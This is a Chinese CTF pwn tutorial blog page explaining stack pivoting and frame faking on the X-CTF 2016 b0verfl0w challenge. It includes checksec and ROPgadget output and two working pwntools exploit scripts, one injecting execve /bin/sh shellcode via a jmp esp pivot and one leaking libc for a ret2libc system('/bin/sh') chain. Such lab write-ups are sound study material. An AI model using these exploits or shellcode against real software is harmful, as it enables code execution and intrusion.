@@ -1,0 +1,244 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>pwn入门-花式栈溢出 | Leonlist's Blog</title><meta name="description" content="stack pivoting原理该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后在相应位置进行ROP。一般来说，我们可能在下述情况使用劫持栈指针。  可以控制栈溢出的字节数较少，难以构造较长的ROP链。 开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域。 其他漏洞难以利用，需要进行转换，比如将栈劫持到推空间，从而在堆上写rop及进行堆漏洞利用。  此外，栈指针劫持有以下几个要求："><meta name="keywords" content="Pwn"><meta name="author" content="Leonlist"><meta name="copyright" content="Leonlist"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/logo.jpg"><link rel="canonical" href="http://yoursite.com/2020/09/11/pwn%E5%85%A5%E9%97%A8-%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="pwn入门-花式栈溢出"><meta property="og:url" content="http://yoursite.com/2020/09/11/pwn%E5%85%A5%E9%97%A8-%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA/"><meta property="og:site_name" content="Leonlist's Blog"><meta property="og:description" content="stack pivoting原理该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后在相应位置进行ROP。一般来说，我们可能在下述情况使用劫持栈指针。  可以控制栈溢出的字节数较少，难以构造较长的ROP链。 开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域。 其他漏洞难以利用，需要进行转换，比如将栈劫持到推空间，从而在堆上写rop及进行堆漏洞利用。  此外，栈指针劫持有以下几个要求："><meta property="og:image" content="https://i.loli.net/2019/11/10/bEJsXxewpOGuRD8.png"><meta property="article:published_time" content="2020-09-11T06:38:41.000Z"><meta property="article:modified_time" content="2020-09-11T07:33:01.889Z"><meta name="twitter:card" content="summary"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.1.1',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  bookmark: {
+    message_prev: 'Press',
+    message_next: 'to bookmark this page'
+  },
+  runtime: '',
+  last_push_date: {"zeroDay":"Today","suffix":"days ago"},
+  copyright: undefined,
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  baiduPush: false,
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+      const now = new Date()
+      const expiryDay = ttl * 86400000
+      const item = {
+        value: value,
+        expiry: now.getTime() + expiryDay,
+      }
+      localStorage.setItem(key, JSON.stringify(item))
+    },
+  
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2020-09-11 15:33:01'
+}</script><noscript><style type="text/css">
+#nav {
+  opacity: 1
+}
+.justified-gallery img {
+  opacity: 1
+}
+</style></noscript><script>var activateDarkMode = function () {
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
+  }
+}
+var activateLightMode = function () {
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
+  }
+}
+
+var autoChangeMode = 'false'
+var t = saveToLocal.get('theme')
+if (autoChangeMode === '1') {
+  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+  if (t === undefined) {
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport) {
+      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
+      var now = new Date()
+      var hour = now.getHours()
+      var isNight = hour <= 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
+    }
+    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+      if (saveToLocal.get('theme') === undefined) {
+        e.matches ? activateDarkMode() : activateLightMode()
+      }
+    })
+  } else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else if (autoChangeMode === '2') {
+  now = new Date()
+  hour = now.getHours()
+  isNight = hour <= 6 || hour >= 18
+  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else {
+  if (t === 'dark') activateDarkMode()
+  else if (t === 'light') activateLightMode()
+}</script><meta name="generator" content="Hexo 5.1.1"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" data-lazy-src="/img/logo.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">20</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">Tags</div><div class="length_num">4</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">Categories</div><div class="length_num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#stack-pivoting"><span class="toc-number">1.</span> <span class="toc-text">stack pivoting</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">1.2.</span> <span class="toc-text">例子</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#frame-faking"><span class="toc-number">2.</span> <span class="toc-text">frame faking</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.1.</span> <span class="toc-text">原理</span></a></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://i.loli.net/2019/11/10/bEJsXxewpOGuRD8.png)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Leonlist's Blog</a></span><span class="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">pwn入门-花式栈溢出</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-09-11T06:38:41.000Z" title="Created 2020-09-11 14:38:41">2020-09-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-09-11T07:33:01.889Z" title="Updated 2020-09-11 15:33:01">2020-09-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/Pwn%E5%AD%A6%E4%B9%A0/">Pwn学习</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后在相应位置进行ROP。一般来说，我们可能在下述情况使用劫持栈指针。</p>
+<ul>
+<li>可以控制栈溢出的字节数较少，难以构造较长的ROP链。</li>
+<li>开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域。</li>
+<li>其他漏洞难以利用，需要进行转换，比如将栈劫持到推空间，从而在堆上写rop及进行堆漏洞利用。</li>
+</ul>
+<p>此外，栈指针劫持有以下几个要求：</p>
+<ul>
+<li>可以控制程序执行流.</li>
+<li>可以控制sp指针，一般来说控制栈指针会使用rop，常见的控制栈指针的gadgets一般为：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rsp&#x2F;esp</span><br></pre></td></tr></table></figure>
+
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>链接：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w/b0verfl0w">https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w/b0verfl0w</a></p>
+<p>checksec查看保护：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bi0x@ubuntu:~/桌面/pwn/otherROP/pivoting$ checksec b0verfl0w</span><br><span class="line">[*] &#x27;/home/bi0x/\xe6\xa1\x8c\xe9\x9d\xa2/pwn/otherROP/pivoting/b0verfl0w&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<p>32位文件，无NX保护，无PIE。</p>
+<p>IDA打开：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nWelcome to X-CTF 2016!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s.&quot;</span>, &amp;s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>fgets 函数存在栈溢出漏洞，但能溢出的字符只有 50 - 0x20 - 4 = 14字节，可以控制栈溢出的字节数较少，难以构造较长的ROP链。这里我们就考虑 stack pivoting 。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置shellcode 并执行。基本利用思路如下</p>
+<img src= "/img/loading.gif" data-lazy-src="/images/pwn%E5%85%A5%E9%97%A8-%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA/aHR0cHM6Ly94aWFvbWluZy0xMjUzMzg1ODEwLmNvcy5hcC1zaGFuZ2hhaS5teXFjbG91ZC5jb20vMjAyMDAyMTgxMTM2NTEucG5n" alt="img" style="zoom:67%;" />
+
+<ul>
+<li>利用栈溢出布置 shellcode，需要小于0x20字节的shellcode。</li>
+<li>shellcode不够0x20个字节的用任意字符填充。</li>
+<li>虚假的ebp地址。</li>
+<li>返回地址，ret相当于pop eip；jmp eip 指令<ul>
+<li>执行到ret时，esp指向ret，pop eip执行完时，esp + 4，指向 sub esp 指令处。</li>
+<li>因为ret地址处为 jmp esp。所以将这个地址pop出来赋给 eip，jmp eip，跳到 eip 处，eip为 jmp esp，则再跳到 esp 处，就相当于跳到了 sub esp 指令处。</li>
+</ul>
+</li>
+<li>sub esp offset；jmp esp 这里两条指令，相当于使esp指向 shellcode 处，跳转 esp 执行shellcode。</li>
+<li>所以说第一个jmp指令为跳转到 sub 指令处，而第二个 jmp 指令为跳转到 shellcode 处。</li>
+<li>需要注意的是：栈无论什么时候都不会被初始化，也不会被清空。所以 shellcode 在内存中依然存在，可以控制 esp 来执行 shellcode。</li>
+</ul>
+<p>所以还需要查找一个 jmp esp 的 gadgets。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bi0x@ubuntu:~/桌面/pwn/otherROP/pivoting$ ROPgadget --binary b0verfl0w --only &#x27;jmp|ret&#x27; </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x080483ab : jmp 0x8048390</span><br><span class="line">0x080484f2 : jmp 0x8048470</span><br><span class="line">0x08048611 : jmp 0x8048620</span><br><span class="line">0x08048504 : jmp esp</span><br><span class="line">0x0804836a : ret</span><br><span class="line">0x0804847e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 6</span><br></pre></td></tr></table></figure>
+
+<p>sub esp offset；offset的确定</p>
+<ul>
+<li>0x20的 shellcode + padding</li>
+<li>0x4的 ebp</li>
+<li>0x4的 ret</li>
+<li>加起来为0x28</li>
+</ul>
+<p>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">sh = process(<span class="string">&#x27;b0verfl0w&#x27;</span>)</span><br><span class="line"><span class="comment">#http://shell-storm.org/shellcode/files/shellcode-841.php</span></span><br><span class="line">shellcode_x86 = <span class="string">&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shellcode_x86 += <span class="string">&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">shellcode_x86 += <span class="string">&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line">jmp_esp = <span class="number">0x08048504</span></span><br><span class="line">sub_esp_jmp = asm(<span class="string">&quot;sub esp,0x28;jmp esp&quot;</span>) <span class="comment">#汇编操作</span></span><br><span class="line"></span><br><span class="line">payload = shellcode_x86 + (<span class="number">0x24</span> - len(shellcode_x86)) * <span class="string">&#x27;a&#x27;</span> + p32(jmp_esp) + sub_esp_jmp</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>还有一种泄露libc_main_start地址，确定libc版本，再使用system地址也可打通。</p>
+<ul>
+<li>通过puts函数泄露libc_main_start地址</li>
+<li>确定libc版本</li>
+<li>计算system地址与/bin/sh地址</li>
+<li>最长的rop链仅需要12个字节，小于14个字节，可以打通。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;b0verfl0w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_main_addr = <span class="number">0x0804a020</span> </span><br><span class="line">puts_addr = <span class="number">0x080483d0</span></span><br><span class="line">start_addr = <span class="number">0x08048400</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">36</span> + p32(puts_addr) + p32(start_addr) + p32(libc_main_addr)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">last_four = sh.recvline()</span><br><span class="line"></span><br><span class="line">last = last_four[<span class="number">-5</span>:<span class="number">-1</span>]</span><br><span class="line"><span class="comment">#切片将输出的libc_main_start地址输出来</span></span><br><span class="line">real_libc_main = u32(last)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;addr:&quot;</span> + hex(real_libc_main)</span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;__libc_start_main&quot;</span>, real_libc_main)</span><br><span class="line">addr_base = real_libc_main - obj.dump(<span class="string">&quot;__libc_start_main&quot;</span>)</span><br><span class="line">system_addr = addr_base + obj.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = addr_base + obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x24</span> * <span class="string">&#x27;a&#x27;</span> + p32(system_addr) + <span class="string">&#x27;aaaa&#x27;</span> + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="frame-faking"><a href="#frame-faking" class="headerlink" title="frame faking"></a>frame faking</h1><p>正如这个技巧名字所说的那样，这个技巧就是构造一个虚假的栈帧来控制程序的执行流。</p>
+<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>概括地讲，我们在之前讲的栈溢出不外乎两种方式</p>
+<ul>
+<li>控制程序 EIP</li>
+<li>控制程序 EBP</li>
+</ul>
+<p>其最终都是控制程序的执行流。在 frame faking 中，我们所利用的技巧便是同时控制 EBP 与 EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。一般来说其 payload 如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer padding|fake ebp|leave ret addr|</span><br></pre></td></tr></table></figure>
+
+<p>即我们利用栈溢出将栈上构造为如上格式。这里我们主要讲下后面两个部分</p>
+<ul>
+<li>函数的返回地址被我们覆盖为执行 leave ret 的地址，这就表明了函数在正常执行完自己的 leave ret 后，还会再次执行一次 leave ret。</li>
+<li>其中 fake ebp 为我们构造的栈帧的基地址，需要注意的是这里是一个地址。一般来说我们构造的假的栈帧如下</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fake ebp</span><br><span class="line">|</span><br><span class="line">v</span><br><span class="line">ebp2|target function addr|leave ret addr|arg1|arg2</span><br></pre></td></tr></table></figure>
+
+<p>这里我们的 fake ebp 指向 ebp2，即它为 ebp2 所在的地址。通常来说，这里都是我们能够控制的可读的内容。</p>
+<p><strong>下面的汇编语法是 intel 语法。</strong></p>
+<p>在我们介绍基本的控制过程之前，我们还是有必要说一下，函数的入口点与出口点的基本操作</p>
+<p>入口点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ebp  # 将ebp压栈</span><br><span class="line">mov ebp, esp #将esp的值赋给ebp</span><br></pre></td></tr></table></figure>
+
+<p>出口点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret #pop eip，弹出栈顶元素作为程序下一个执行地址</span><br></pre></td></tr></table></figure>
+
+<p>其中 leave 指令相当于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp # 将ebp的值赋给esp</span><br><span class="line">pop ebp # 弹出ebp</span><br></pre></td></tr></table></figure>
+
+<p>下面我们来仔细说一下基本的控制过程。</p>
+<ol>
+<li><p>在有栈溢出的程序执行 leave 时，其分为两个步骤：</p>
+<ul>
+<li>mov esp, ebp ，这会将 esp 也指向当前栈溢出漏洞的 ebp 基地址处。</li>
+<li>pop ebp， 这会将栈中存放的 fake ebp 的值赋给 ebp。即执行完指令之后，ebp便指向了ebp2，也就是保存了 ebp2 所在的地址。</li>
+</ul>
+</li>
+<li><p>执行 ret 指令，会再次执行 leave ret 指令。</p>
+</li>
+<li><p>执行 leave 指令，其分为两个步骤</p>
+<ul>
+<li>mov esp, ebp ，这会将 esp 指向 ebp2。</li>
+<li>pop ebp，此时，会将 ebp 的内容设置为 ebp2 的值，同时 esp 会指向 target function。</li>
+</ul>
+</li>
+<li><p>执行 ret 指令，这时候程序就会执行 target function，当其进行程序的时候会执行</p>
+<ul>
+<li><p>push ebp，会将 ebp2 值压入栈中，</p>
+</li>
+<li><p>mov ebp, esp，将 ebp 指向当前基地址。</p>
+</li>
+</ul>
+</li>
+</ol>
+<p>此时的栈结构如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ebp</span><br><span class="line">|</span><br><span class="line">v</span><br><span class="line">ebp2|leave ret addr|arg1|arg2</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li><p>当程序执行时，其会正常申请空间，同时我们在栈上也安排了该函数对应的参数，所以程序会正常执行。</p>
+</li>
+<li><p>程序结束后，其又会执行两次 leave ret addr，所以如果我们在 ebp2 处布置好了对应的内容，那么我们就可以一直控制程序的执行流程。</p>
+</li>
+</ol>
+<p>可以看出在 fake frame 中，我们有一个需求就是，我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与 stack pivoting 相似。</p>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Leonlist</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2020/09/11/pwn%E5%85%A5%E9%97%A8-%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA/">http://yoursite.com/2020/09/11/pwn%E5%85%A5%E9%97%A8-%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2019/11/10/bEJsXxewpOGuRD8.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/09/21/CTF%E5%AF%86%E7%A0%81%E5%AD%A6-RSA/"><img class="prev-cover" data-lazy-src="https://i.loli.net/2019/11/10/bEJsXxewpOGuRD8.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">CTF密码学-RSA</div></div></a></div><div class="next-post pull-right"><a href="/2020/09/10/buuctf%20ciscn_2019_c_1/"><img class="next-cover" data-lazy-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">BUUCTF ciscn_2019_c_1</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2020/08/26/pwn基础-C程序漫游/" title="pwn基础--C程序漫游"><img class="relatedPosts_cover" data-lazy-src="https://i.loli.net/2019/11/10/rJbFpE65tmxPv7R.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-26</div><div class="relatedPosts_title">pwn基础--C程序漫游</div></div></a></div><div class="relatedPosts_item"><a href="/2020/08/26/pwn基础-C与汇编(1)/" title="pwn基础--C与汇编(1)"><img class="relatedPosts_cover" data-lazy-src="https://i.loli.net/2019/11/10/71wgohfPHqXRbG9.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far 